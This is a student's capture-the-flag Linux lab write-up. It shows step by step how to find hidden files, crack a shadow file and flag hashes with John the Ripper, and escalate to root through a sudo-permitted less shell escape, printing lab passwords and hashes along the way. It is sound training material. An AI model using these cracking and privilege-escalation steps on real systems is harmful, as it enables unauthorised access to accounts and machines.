# Linux Lab

## Description  

This lab involves performing a series of investigative tasks, including password recovery, user account penetration, log file analysis, file permission auditing, debugging scripts, inspecting custom aliases, exploiting vulnerabilities for root access, and password cracking to gather and decode all flags.  

## Operating System  

- **Linux**  

## Skills Gained and Excercised

- **Hands-On Linux Experience**
- **Tool Mastery**
- **Security Awareness**
- **Critical Thinking**

---

## Finding Flag 1  
- Flag 1 Indicator: Finding this flag is imperative to moving on quickly, as it contains the passwords from users before they are hacked. Luckily, it doesn't have a great hiding spot.

### Steps/Commands to Locate and Retrieve Flag 1  

##### 1. List all files and directories, including hidden ones
ls -Ra

##### 2. Navigate to the desktop directory
cd ~/Desktop/

##### 3. View all files (including hidden files)
ls -a

##### 4. Access the flag (read the contents of .flag_1)
nano .flag_1

  
![Screenshot 2024-10-31 at 8 16 27 PM](https://github.com/user-attachments/assets/3a31164e-32c3-46c6-b9a5-4db7aa7559f9)



## Finding Flag 2  
- Flag 2 Indicator: A famous hacker had created a user on the system a year ago. Find this user, crack his password, and login to his account.

### Steps/Commands to Locate and Retrieve Flag 2  

##### 1. Navigate to the desktop directory
cd ~/Desktop/

##### 2. Crack the password hashes with John the Ripper
john --wordlist=.pass_list.txt ../Documents/my-files/shadow

##### 3. Show the cracked passwords
john --show ../Documents/my-files/shadow

##### 4. Switch to the user account 'mitnick'
su mitnick

##### 5. Retrieve the flag after logging in
##### (The flag will be displayed once logged in as 'mitnick')


![Screenshot 2024-10-31 at 8 20 08 PM](https://github.com/user-attachments/assets/6cf41d10-4099-424e-a73d-c93ebd449cc8)



## Finding Flag 3  
- Flag 3 Indicator: Find a log file related to the hacker's name and a zip file with additional info.

### Steps/Commands to Locate and Retrieve Flag 3

##### 1. Navigate to the mitnick user's home directory
cd /home/mitnick

##### 2. List all files and directories, including hidden ones
ls -Ra

##### 3. Identify the .secret.zip file in the Documents directory
ls ~/Documents

##### 4. View the log file in /var/log directory
ls /var/log

##### 5. Count the number of unique IP addresses in the mitnick.log file
cat /var/log/mitnick.log | sort | uniq | wc -l

##### 6. Use the count (102) as the password to unzip the secret.zip file
unzip ~/Documents/.secret.zip

##### 7. Inspect the contents of the unzipped file, which is named "babbage"
ls

##### 8. Read the contents of the "babbage" file to find the password for the babbage user
nano babbage


![Screenshot 2024-10-31 at 8 39 27 PM](https://github.com/user-attachments/assets/06cef98f-3301-429b-aaa9-bb08e8a05599)


##### 9. Log in as the babbage user to find flag_3
su babbage
##### Enter the password: freedom

##### 10. Retrieve the flag after successfully logging in as babbage


![Screenshot 2024-10-31 at 8 44 39 PM](https://github.com/user-attachments/assets/53b27e21-bd67-4ebc-a94b-ecbf25006b5e)



## Finding Flag 4  
- Flag 4 Indicator: Find a directory with a list of hackers. Look for a file that has read permissions for the owner, no permissions for groups, and executable only for everyone else.

### Steps/Commands to Locate and Retrieve Flag 4

##### 1. Navigate to the babbage user's home directory
cd /home/babbage/

##### 2. List all files and directories, including hidden ones
ls -Ra

##### 3. Switch to the Documents directory where hacker files are stored
cd Documents

##### 4. List the permissions of all files in the Documents directory
ls -l

##### 5. Filter the files with read permissions for the owner, no permissions for groups, and executable only for everyone else
ls -l | grep "^\-r\-\-\-\-\-\-\-x"

##### 6. Inspect the contents of the "stallman" file (the one with content)
cat stallman

##### 7. Retrieve the password for the stallman user
##### The password is "computer"

##### 8. Log in as the stallman user to find flag_4
su stallman
##### Enter the password: computer

##### 9. Retrieve the flag after successfully logging in as stallman


![Screenshot 2024-10-31 at 8 48 20 PM](https://github.com/user-attachments/assets/87873da2-6bee-4c39-978d-b3fce25127bf)



## Finding Flag 5  
- Flag 5 Indicator: This user is writing a Bash script, except it isn't quite working yet. Find it, debug it, and run it.

### Steps/Commands to Locate and Retrieve Flag 5

##### 1. Navigate to the stallman user's home directory
cd

##### 2. List all files and directories, including hidden ones
ls -Ra

##### 3. Go to the Documents directory where the script is located
cd Documents/

##### 4. Make the script executable
chmod +x flag5.sh

##### 5. Run the script to check for syntax errors
./flag5.sh

##### 6. Inspect the first few lines of the script to find the error
head -6 flag5.sh

##### 7. Edit the script to remove the extra "do" on line 4
##### In the script, remove one of the "do"s, then save and exit

##### 8. Run the script again to check for the next error
./flag5.sh

##### 9. Inspect the error message and notice the missing "then" in the if statement
##### Add the missing "then" after "if [ ${#file} -gt $width ]"

##### 10. Run the script again
./flag5.sh

##### 11. The script will now execute correctly and display the flag:


![Screenshot 2024-10-31 at 8 54 49 PM](https://github.com/user-attachments/assets/d8bc1a79-640f-434f-82a8-222e43d24c95)



## Finding Flag 6  
- Flag 6 Indicator: Inspect this user's custom aliases and run the suspicious on to find the proper flag.

### Steps/Commands to Locate and Retrieve Flag 6

##### 1. Log in as the sysadmin user
su sysadmin
##### Enter the password

##### 2. Navigate to the sysadmin user's home directory
cd

##### 3. Run the alias command to list all custom aliases for the sysadmin user
alias

##### 4. Find the alias definition for 'flag' in the list:
##### alias flag='echo You found \'flag_6:$1$Qbq.XLLp$oj.BXuxR2q99bJwNEFhSH1\''

##### 5. Run the flag alias to display the flag
flag

##### 6. The flag will be displayed:


![Screenshot 2024-10-31 at 8 56 14 PM](https://github.com/user-attachments/assets/47616afe-47b8-4608-bd2a-8423c471d9c1)



## Finding Flag 7  
- Flag 7 Indicator: Find and exploit to gain a root shell.

### Steps/Commands to Locate and Retrieve Flag 7

##### 1. Check which commands the sysadmin user can run with sudo
sudo -l

##### Output will indicate that sysadmin can run /usr/bin/less with sudo

##### 2. Create an empty file and run less with sudo
touch file && sudo less file

##### 3. Drop into a root shell from less by entering the following commands:
##### : then !bash

##### 4. Change the password for the root user
passwd
##### Enter the new password when prompted and confirm it

##### 5. Exit the root shell
exit

##### 6. Log in as the root user with the new password
su root
##### Enter the new password for root when prompted


![Screenshot 2024-10-31 at 9 08 26 PM](https://github.com/user-attachments/assets/2b1f2d4f-2cb8-491d-9262-99420e8a3d9d)



## Finding Flag 8  
- Flag 8 Indicator: Gather each of the 7 flags into a file and format it as if each flag was a username and password. Crack the passwords for the final flag.

### Steps/Commands to Locate and Retrieve Flag 8

##### 1. Search for all references to 'flag' in /home/ and output to the terminal
grep -ir 'flag' /home/

##### 2. Output the search results to a file called "flags"
grep -ir 'flag' /home/ > flags

##### 3. Append the contents of /var/tmp/5galf to the "flags" file
cat /var/tmp/5galf >> flags

##### 4. Search for 'flag' in the root user's .bashrc file and append to "flags"
grep -r 'flag' /root/.bashrc >> flags

##### 5. Edit the "flags" file with nano to remove unnecessary text, backslashes, and extra characters
nano flags
##### The file should now look like this:
##### flag_1:$1$WYmnR327$5C1yY4flBxB1cLjkc92Tq.
##### flag_2:$1$PEDICYq8$6/U/a5Ykxw1OP0.eSrMZO0
##### flag_3:$1$Y9tp8XTi$m6pAR1bQ36oAh.At4G5s3.
##### flag_4:$1$lGQ7QprJ$m4eE.b8jhvsp8CNbuIF5U0
##### flag_5:$1$zuzYyKCN$secHwYBXIELGqOv8rWzG00
##### flag_6:$1$Qbq.XLLp$oj.BXuxR2q99bJwNEFhSH1
##### flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0

##### 6. Crack the "flags" file with john using the pass_list.txt file found in /home/student/Desktop/.pass_list.txt
john --wordlist=/home/student/Desktop/.pass_list.txt flags

##### 7. Once john completes, use the "--show" option to display the cracked passwords
john --show flags
##### Output:
##### flag_1:Congratulations
##### flag_2:You
##### flag_3:have
##### flag_4:completed
##### flag_5:this
##### flag_6:cyber
##### flag_7:challenge.


---


## Key Takaways: 
This lab provided a comprehensive hands-on experience with Linux system administration, security, and command-line tools. It involved exploring directories and files using commands like `ls`, `cd`, `grep`, and `find` to locate specific content and understand file structures. A key focus was on interpreting and modifying file permissions with `chmod` and `ls -l`, emphasizing the roles of owner, group, and others in access control. Debugging shell scripts was another essential skill developed, involving the identification and correction of errors using tools like `nano` and `head`. The lab also highlighted the utility of aliases to simplify repetitive commands and how to locate and understand pre-defined configurations. 

Privilege escalation was explored by leveraging `sudo` to execute specific commands with elevated rights, demonstrating the risks of misconfigured `sudo` permissions. Techniques like using `less` with `sudo` to access a root shell underscored the importance of security in system administration. Password management and cracking were integral components, including changing user passwords with `passwd`, switching users with `su`, and cracking hashes with tools like `john` using a provided wordlist. I also practiced combining and processing file contents with commands like `cat` and `>>`, followed by cleaning and organizing data using text editors like `nano`.

The lab emphasized the importance of secure configuration and minimal privilege principles. It demonstrated the risks of weak passwords and misconfigured privileges while teaching critical skills like command chaining, piping, and understanding the basics of hash formats. Ultimately, this project offered a robust introduction to Linux environments, security principles, and system administration tools, fostering critical thinking and practical expertise essential for cybersecurity professionals.
